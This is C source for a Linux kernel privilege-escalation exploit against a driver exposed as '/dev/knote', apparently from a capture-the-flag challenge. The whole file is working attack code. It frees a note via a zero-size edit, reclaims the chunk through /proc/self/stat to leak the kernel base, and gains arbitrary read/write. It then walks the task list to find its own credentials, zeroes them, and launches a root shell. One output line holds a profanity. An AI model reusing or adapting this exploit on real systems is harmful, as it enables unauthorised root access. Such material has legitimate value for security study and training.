#include <fcntl.h>
#include <signal.h>
#include <stdatomic.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <unistd.h>

#define DEVICE "/dev/knote"

// Task structure offsets
#define TASKS_OFF 0x458
#define CRED_OFF 0x700
#define PID_OFF 0x520

typedef struct {
  char *title;
  char *desc;
  ulong size;
  ulong owner;
} knote_req;

#define INIT_TASK 0x1a0c900
#define TASK_SIZE 0x730

int knote_add(int fd, char *title, char *desc, ulong size);
int knote_edit(int fd, char *title, char *desc, ulong size);
int knote_remove(int fd, char *title);
int knote_transfer(int fd, char *title, ulong new_owner);
knote_req knote_view(int fd, char *title);
knote_req knote_info(int fd, char *title);
long read_long(int fd, unsigned long address);

int knote_add(int fd, char *title, char *description, ulong size) {
  knote_req req = {.title = title, .desc = description, .size = size};

  return ioctl(fd, 0xd00d0000, &req);
}

int knote_edit(int fd, char *title, char *description, ulong size) {
  knote_req req = {.title = title, .desc = description, .size = size};

  return ioctl(fd, 0xd00d0003, &req);
}

int knote_remove(int fd, char *title) {
  knote_req req = {.title = title};

  return ioctl(fd, 0xd00d0005, &req);
}

int knote_transfer(int fd, char *title, ulong new_owner) {
  knote_req req = {.title = title, .owner = new_owner};

  return ioctl(fd, 0xd00d0004, &req);
}

knote_req knote_view(int fd, char *title) {
  knote_req req = knote_info(fd, title);
  req.desc = malloc(req.size);

  ioctl(fd, 0xd00d0002, &req);

  return req;
}

knote_req knote_info(int fd, char *title) {
  knote_req req = {.title = title};

  ioctl(fd, 0xd00d0001, &req);
  return req;
}

void hexdump(char *buf, int size) {
  for (int i = 0; i < size; i = i + 8) {
    printf("0x%016llx\n", *(unsigned long long *)(&buf[i]));
  }
}

int main() {

  int result;

  int fd = open(DEVICE, O_RDWR);
  if (fd < 0) {
    perror("Error opening the device");
    return EXIT_FAILURE;
  }
  printf("[+] Device opened. File descriptor: %d\n", fd);

  // Allocate a note
  char *first_chunk = "first_chunk";
  result = knote_add(fd, first_chunk, first_chunk, 0x20);
  if (result < 0) {
    perror("Error adding 'first_chunk'");
    return EXIT_FAILURE;
  }
  printf("[+] first_chunk allocated\n");

  // This is equivalent to free().
  knote_edit(fd, first_chunk, first_chunk, 0);
  printf("[+] first_chunk descprition freed\n");

  // This reallocate the last freed chunk with a kernel struct
  int stat_fd = open("/proc/self/stat", O_RDONLY);
  if (stat_fd < 0) {
    perror("Error opening /proc/self/stat");
    return EXIT_FAILURE;
  }
  printf("[+] /proc/self/stat opened. File descriptor: %d\n", stat_fd);

  result = close(stat_fd);
  if (result < 0) {
    perror("Error closing /proc/self/stat");
    return EXIT_FAILURE;
  }
  printf("[+] Closed /proc/self/stat\n");

  knote_req r = knote_view(fd, first_chunk);
  unsigned long long kbase = *(long *)&r.desc[0] - 0x2b4670;
  if (kbase < 0xffffffff81000000) {
    perror("Kernel base wrong");
    return EXIT_FAILURE;
  }
  printf("[+] Leaked kbase: 0x%016llx\n", kbase);

  // 2nd part: arbitrary write
  char *second_chunk = "second_chunk";
  result = knote_add(fd, second_chunk, second_chunk, 0x48);
  if (result < 0) {
    perror("Error adding second_chunk");
    return EXIT_FAILURE;
  }
  printf("[+] second_chunk allocate\n");

  knote_edit(fd, second_chunk, second_chunk, 0);

  char *third_chunk = "third_chunk";
  result = knote_add(fd, third_chunk, third_chunk, TASK_SIZE);
  if (result < 0) {
    perror("Error adding third_chunk");
    return EXIT_FAILURE;
  }
  printf("[+] third_chunk allocated\n");

  int this_pid = getpid();
  if (this_pid < 0) {
    perror("Error getting pid of this file");
  }
  printf("[+] This process PID: %d\n", this_pid);

  unsigned long long current_element = kbase + INIT_TASK;
  printf("Searching for PID in task list, starting from 0x%016llx\n",
         current_element);

  int task_pid;
  unsigned long long cred;
  for (int i = 0; i < 70; i++) {
    printf("[+] Reading task at 0x%016llx\n", current_element);
    // change second chunk pointer
    r = knote_view(fd, second_chunk);
    ((unsigned long long *)(r.desc))[6] = current_element;
    knote_edit(fd, second_chunk, r.desc, 0x48);

    // read task_struct
    r = knote_view(fd, third_chunk);

    // compare pid
    task_pid = *(int *)(&r.desc[PID_OFF]);
    // printf("    PID found: %d\n", task_pid);

    if (task_pid != this_pid) {
      // printf("[+] Found task_struct of this process at 0x%016llx\n",
      // current_element);
      current_element = *(unsigned long long *)(&r.desc[TASKS_OFF]) - TASKS_OFF;
      continue;
    }

    cred = *(unsigned long long *)(&r.desc[CRED_OFF]);
    break;
  }

  printf("[+] Cred struct at 0x%016llx\n", cred);
  printf("[+] Overwriting id\n");
  r = knote_view(fd, second_chunk);
  ((unsigned long long *)(r.desc))[6] = cred;
  knote_edit(fd, second_chunk, r.desc, 0x48);
  r = knote_view(fd, third_chunk);
  for (int i = 1; i < 7; i++) {
    ((int *)(r.desc))[i] = 0;
  }
  knote_edit(fd, third_chunk, r.desc, 0xc0);

  printf("[+] OVERWRITTEN PORCODIOOOOOOOOOO\n");
  system("/bin/sh");

  result = close(fd);
  if (result < 0) {
    perror("Error closing device");
    return EXIT_FAILURE;
  }
  printf("[+] Device closed\n");

  return 0;
}
